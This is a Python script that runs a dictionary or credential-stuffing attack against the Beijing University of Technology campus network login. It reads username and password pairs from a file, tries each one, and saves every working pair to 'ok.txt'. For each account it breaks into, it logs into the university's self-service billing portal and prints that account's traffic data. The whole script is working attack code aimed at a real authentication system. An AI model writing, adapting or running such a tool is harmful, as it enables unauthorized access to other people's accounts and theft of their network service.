# coding=utf-8
# import io
import urllib.parse
import urllib.request
import json
import requests
from html.parser import HTMLParser


def is_success(html_raw):
    class HtmlPar(HTMLParser):
        flg_title = False
        flg_success = False

        def handle_starttag(self, tag, attrs):
            if tag == 'title':
                HtmlPar.flg_title = True

        def handle_endtag(self, tag):
            if tag == 'title':
                HtmlPar.flg_title = False

        def handle_data(self, data):
            if HtmlPar.flg_title and data == "登录成功窗":
                HtmlPar.flg_success = True

    html_par = HtmlPar()
    html_bin = html_raw.decode("GB2312")
    html_par.feed(html_bin)
    if html_par.flg_success:
        return True
    else:
        return False


def log_out():
    html_url = "https://lgn.bjut.edu.cn/F.html"
    try:
        requests.get(html_url)
    except:
        print("No need to logout or logout err.")
    return


def get_used_traffic():
    class HtmlPar(HTMLParser):
        ct_script = 0
        flg_script = False
        used_data = ""

        def handle_starttag(self, tag, attrs):
            if len(attrs) != 0 and len(attrs[0]) != 0:
                if tag == "script" and attrs[0][1] == "JavaScript":
                    HtmlPar.ct_script = HtmlPar.ct_script + 1
                    HtmlPar.flg_script = True

        def handle_endtag(self, tag):
            if tag == "script": HtmlPar.flg_script = False

        def handle_data(self, data):
            if HtmlPar.flg_script and HtmlPar.ct_script == 1:
                str_idx_s = data.index("';flow='") + 8
                str_idx_e = data.index("  ';fsele=", str_idx_s)
                HtmlPar.used_data = data[str_idx_s:str_idx_e]

    html_url = "https://lgn.bjut.edu.cn/"
    html_req = urllib.request.Request(html_url, None)
    try:
        html_res = urllib.request.urlopen(html_req, timeout=1)
    except:
        print("Failed to get used traffic.")
        return -1
    html_raw = html_res.read()
    html_par = HtmlPar()
    html_bin = html_raw.decode("GB2312")
    html_par.feed(html_bin)
    return html_par.used_data

def get_check_code():
    class HtmlPar(HTMLParser):
        ct_script = 0
        flg_script = False
        check_code=''
        def handle_starttag(self, tag, attrs):
            if len(attrs) == 1 and len(attrs[0]) == 2:
                if tag == "script" and attrs[0][1] == "text/javascript":
                    HtmlPar.ct_script = HtmlPar.ct_script + 1
                    HtmlPar.flg_script = True
        def handle_endtag(self, tag):
            if tag == "script": HtmlPar.flg_script = False
        def handle_data(self, data):
            if HtmlPar.flg_script and HtmlPar.ct_script == 1:
                str_idx_s = data.index('var checkcode="') + 15
                str_idx_e = data.index('";', str_idx_s)
                HtmlPar.check_code = data[str_idx_s:str_idx_e]

    # Get check code
    html_url = "https://jfself.bjut.edu.cn/nav_login"
    html_req = urllib.request.Request(html_url)
    try:
        html_res = urllib.request.urlopen(html_req, timeout=1)
    except:
        print("Failed to get check code.")
        return -1
    html_raw = html_res.read()
    html_cookie=html_res.headers['Set-Cookie'].strip("; Path=/; HttpOnly")
    html_par = HtmlPar()
    html_bin = html_raw.decode("UTF8")
    html_par.feed(html_bin)
    return html_par.check_code, html_cookie

def get_total_traffic(check_code, u_name, u_pass, html_cookie):
    # log the fuck in
    html_url = "https://jfself.bjut.edu.cn/LoginAction.action"
    html_values={
        'account' : u_name,
        'password': u_pass,
        'code':'',
        'checkcode': check_code,
        'Submit': 'Login'
    }
    html_headers={
        'cookie': html_cookie,
        'Connection': 'Keep-Alive',
        'Accept': 'text/html, application/xhtml+xml, */*',
        'Accept-Encoding': 'gzip, deflate',
        'DNT': '1',
        'Cache-Control': 'no-cache',
        'Accept-Language': 'en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://jfself.bjut.edu.cn/nav_login'
    }
    html_data = urllib.parse.urlencode(html_values).encode(encoding='UTF8')
    html_req = urllib.request.Request(html_url, html_data, html_headers)
    try:
        urllib.request.urlopen(html_req, timeout=1)
    except:
        print("Failed to login the mgr platform.")
        return -1

    # get the fucking json
    html_url = "https://jfself.bjut.edu.cn/refreshaccount"
    html_req = urllib.request.Request(html_url, None, html_headers)
    try:
        html_res = urllib.request.urlopen(html_req, timeout=1)
    except:
        print("Failed to get total traffic.")
        return -1

    html_raw = html_res.read()
    html_bin = html_raw.decode("UTF8")
    # deal with json
    print(html_bin)
    #dic_json = json.loads(html_bin)
    #return int(dic_json['note']['leftFlow'])*1024
    return

# open dict
f_dic = open("dic.txt")
f_out = open("ok.txt", "w")
u_name = f_dic.readline().strip('\n')
u_pass = f_dic.readline().strip('\n')
while u_name != "" and u_pass != "":
    # try the pair
    print("Trying", u_name, "with password", u_pass, end='')
    html_values = {
        'DDDDD': u_name,
        'upass': u_pass,
        'v46s': '1',
        '0MKKey': ''
    }
    html_data = urllib.parse.urlencode(html_values).encode(encoding='UTF8')
    html_url = "https://lgn.bjut.edu.cn/"
    html_req = urllib.request.Request(html_url, html_data)
    html_res = urllib.request.urlopen(html_req, timeout=3)
    html_raw = html_res.read()

    # parse html
    if is_success(html_raw):
        # login successfully
        f_out.write(u_name + ',' + u_pass + '\n')
        print("\tSuccess!")
        # get used traffic - to be done
        print(get_used_traffic())
        check_code, html_cookie = get_check_code()
        print(check_code, html_cookie)
        print(get_total_traffic(check_code,u_name,u_pass,html_cookie))
        log_out()
    else:
        print("\tFailed.")

    u_name = f_dic.readline().strip('\n')
    u_pass = f_dic.readline().strip('\n')

f_dic.close()
f_out.close()
